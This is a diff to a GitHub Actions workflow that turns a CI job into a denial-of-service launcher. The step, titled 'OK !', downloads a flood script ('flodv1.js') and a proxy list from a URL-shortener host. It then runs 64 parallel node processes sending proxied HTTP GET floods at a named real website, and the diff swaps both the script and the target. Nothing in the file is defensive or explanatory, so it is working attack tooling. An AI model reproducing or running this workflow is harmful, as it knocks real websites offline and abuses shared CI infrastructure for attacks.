@@ -15,13 +15,13 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://github.com/kaneious/tornado/raw/refs/heads/main/tornado.js
+          wget https://curl.by/KfYf3/flodv1.js
           wget https://curl.by/LM2U8/proxies.txt
           npm i hpack
-          chmod +x tornado.js
+          chmod +x flodv1.js
           PIDS=()
           for i in {1..64}; do
-            timeout 60 node tornado.js GET https://www.zulaoyun.com/ 60 9 90 fres.txt --full --query 3
+            timeout 60 node flodv1.js GET https://hexbear.xyz/ 60 9 90 fres.txt --full --query 3
             PIDS+=($!)
           done
           
